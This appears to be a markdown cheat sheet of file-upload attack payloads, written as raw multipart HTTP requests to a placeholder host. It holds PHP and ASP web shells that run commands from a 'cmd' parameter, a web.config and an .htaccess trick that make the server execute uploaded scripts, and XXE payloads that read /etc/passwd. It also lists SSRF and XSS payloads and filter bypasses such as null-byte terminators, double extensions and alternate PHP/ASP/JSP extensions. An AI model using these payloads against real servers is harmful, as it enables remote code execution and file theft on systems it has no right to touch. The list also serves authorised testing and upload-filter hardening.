#### HTML Extention Allowed - XSS
```
POST /upload HTTP/1.1
Host: website.com
Content-Type: multipart/form-data; boundary=-----------------------------4829104394923874193918493216

-----------------------------4829104394923874193918493216
Content-Disposition: form-data; name="file" filename="xss.html"
Content-Type: text/html

<script>alert(1)</script>
-----------------------------4829104394923874193918493216
```

#### PHP Extention Allowed - RCE
```
POST /upload HTTP/1.1
Host: website.com
Content-Type: multipart/form-data; boundary=-----------------------------4829104394923874193918493216

-----------------------------4829104394923874193918493216
Content-Disposition: form-data; name="avatar"; filename="webshell.php"
Content-Type: text/php

<?php 
echo "shelled: ";
system($_GET['cmd']); 
?>
-----------------------------4829104394923874193918493216
```

#### SVG Extention Allowed - XXS / XXE / SSRF
```
POST /upload HTTP/1.1
Host: website.com
Content-Type: multipart/form-data; boundary=-----------------------------4829104394923874193918493216

-----------------------------4829104394923874193918493216
Content-Disposition: form-data; name="avatar"; filename="xss.svg"
Content-Type: image/svg+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert("window.origin");</script>
</svg>
-----------------------------4829104394923874193918493216
```

```
POST /upload HTTP/1.1
Host: website.com
Content-Type: multipart/form-data; boundary=-----------------------------4829104394923874193918493216

-----------------------------4829104394923874193918493216
Content-Disposition: form-data; name="avatar"; filename="xxe.svg"
Content-Type: image/svg+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
-----------------------------4829104394923874193918493216
```

```
POST /upload HTTP/1.1
Host: website.com
Content-Type: multipart/form-data; boundary=-----------------------------4829104394923874193918493216

-----------------------------4829104394923874193918493216
Content-Disposition: form-data; name="avatar"; filename="ssrf.svg"
Content-Type: image/svg+xml

<svg width="200" height="200"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="{interactsh}" height="200" width="200"/>
</svg>
-----------------------------4829104394923874193918493216
```

#### Config Extention Allowed - RCE
```
POST /upload HTTP/1.1
Host: website.com
Content-Type: multipart/form-data; boundary=-----------------------------4829104394923874193918493216

-----------------------------4829104394923874193918493216
Content-Disposition: form-data; name="avatar"; filename="webshell.config"
Content-Type: application/octet-stream

<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Response.write("-"&"->")
' it is running the ASP code if you can see 3 by opening the web.config file!
Response.write(1+2)
Response.write("<!-"&"-")
%>
-->
-----------------------------4829104394923874193918493216
```

#### ASP Extention Allowed - RCE
```
POST /upload HTTP/1.1
Host: website.com
Content-Type: multipart/form-data; boundary=-----------------------------4829104394923874193918493216

-----------------------------4829104394923874193918493216
Content-Disposition: form-data; name="avatar"; filename="webshell.asp"
Content-Type: application/octet-stream

<% eval request("cmd") %>
-----------------------------4829104394923874193918493216
```

#### XML Extention Allowed - XXE
```
POST /upload HTTP/1.1
Host: website.com
Content-Type: multipart/form-data; boundary=-----------------------------4829104394923874193918493216

-----------------------------4829104394923874193918493216
Content-Disposition: form-data; name="avatar"; filename="xxe.xml"
Content-Type: image/svg+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
-----------------------------4829104394923874193918493216
```
#### Htaccess Extention Allowed - RCE
Only works on Apache servers. The uploaded .htaccess file will change the apache configuration to allow us to up a php file under a different extension.
```
POST /upload HTTP/1.1
Host: website.com
Content-Type: multipart/form-data; boundary=-----------------------------4829104394923874193918493216

-----------------------------4829104394923874193918493216
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: plain/text

AddType application/x-httpd-php .shelled
-----------------------------4829104394923874193918493216
```

```
POST /upload HTTP/1.1
Host: website.com
Content-Type: multipart/form-data; boundary=-----------------------------4829104394923874193918493216

-----------------------------4829104394923874193918493216
Content-Disposition: form-data; name="avatar"; filename="webshell.shelled"
Content-Type: text/php

<?php 
echo "shelled: ";
system($_GET['cmd']); 
?>
-----------------------------4829104394923874193918493216
```

#### SHTML/SHTM Extension Allowed
`.shtml` and `.shtm` files are related to a scripting language called Server Side Includes. They are meant to allow for pages to include other pages using some HTML-like syntax.
```
POST /upload HTTP/1.1
Host: website.com
Content-Type: multipart/form-data; boundary=-----------------------------4829104394923874193918493216

-----------------------------4829104394923874193918493216
Content-Disposition: form-data; name="file" filename="xss.shtml"
Content-Type: text/html

<script>alert(1)</script>
-----------------------------4829104394923874193918493216
```

#### XSLT Extention Allowed
Extensible Stylesheet Language Transformations (XSLT) is an XML-based language usually used when transforming XML documents into HTML, another XML document, or PDF. 
```
POST /upload HTTP/1.1
Host: website.com
Content-Type: multipart/form-data; boundary=-----------------------------4829104394923874193918493216

-----------------------------4829104394923874193918493216
Content-Disposition: form-data; name="file" filename="xss.xslt"
Content-Type: image/svg+xml

<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:output method="html"/>
<xsl:template match="/">
    <h2>XSLT identification</h2>
    <b>Version:</b> <xsl:value-of select="system-property('xsl:version')"/><br/>
    <b>Vendor:</b> <xsl:value-of select="system-property('xsl:vendor')" /><br/>
    <b>Vendor URL:</b><xsl:value-of select="system-property('xsl:vendor-url')" /><br/>
</xsl:template>
</xsl:stylesheet>
-----------------------------4829104394923874193918493216
```

# Bypasses

#### Keeping The Image Header 
`ÿØÿà` is the magic bytes for jpg file format.
```
-----------------------------4829104394923874193918493216
Content-Disposition: form-data; name="avatar"; filename="upload.jpg"
Content-Type: text/html

ÿØÿà
<script>alert(0)</script>
-----------------------------4829104394923874193918493216
```

#### Extention Parsing
The following `upload.php.jpg` could be interpreted as PHP or JPG depending on how the server parses the filename.
```
-----------------------------4829104394923874193918493216
Content-Disposition: form-data; name="avatar"; filename="upload.php.jpg"
Content-Type: text/php

<?php 
echo "shelled: ";
system($_GET['cmd']); 
?>
-----------------------------4829104394923874193918493216
```

#### Trailing Dots
```
-----------------------------4829104394923874193918493216
Content-Disposition: form-data; name="avatar"; filename="upload.php."
Content-Type: text/php

<?php 
echo "shelled: ";
system($_GET['cmd']); 
?>
-----------------------------4829104394923874193918493216
```

#### Terminator
If validation is written in a high-level language like PHP or Java, but the server processes the file using lower-level functions in C/C++, for example, this can cause discrepancies in what is treated as the end of the filename: exploit.php;.jpg or exploit.php%00.jpg
```
-----------------------------4829104394923874193918493216
Content-Disposition: form-data; name="avatar"; filename="upload.php%00.jpg"
Content-Type: text/php

<?php 
echo "shelled: ";
system($_GET['cmd']); 
?>
-----------------------------4829104394923874193918493216
```

#### No File Extention
Sometimes when no file extention is provided it will default to the content-type.
```
-----------------------------4829104394923874193918493216
Content-Disposition: form-data; name="avatar"; filename="upload."
Content-Type: text/php

<?php 
echo "shelled: ";
system($_GET['cmd']); 
?>
-----------------------------4829104394923874193918493216
```

```
-----------------------------4829104394923874193918493216
Content-Disposition: form-data; name="avatar"; filename="upload."
Content-Type: text/html

<script>alert(1)</script>
-----------------------------4829104394923874193918493216
```

#### Capitalization
```
.AsP
.aSpX
.PhP
.hTMl
.SvG
.XmL
.CoNfIg
.HtaCceSs
```

#### PHP File Extention Bypasses
The following file extentions can be used to act like a `.php` file upload:
```
.php 
.php2
.php3
.php4
.php5
.php6
.php7
.phps
.phps
.pht
.phtm
.phtml
.pgif
.shtml
.phar
.inc
```

#### ASP File Extention Bypasses
```
.asp
.aspx
.cer
.asa
```

#### JSP File Extention Bypasses
```
.jsp
.jspx
.jsw
.jsv
.jspf
```
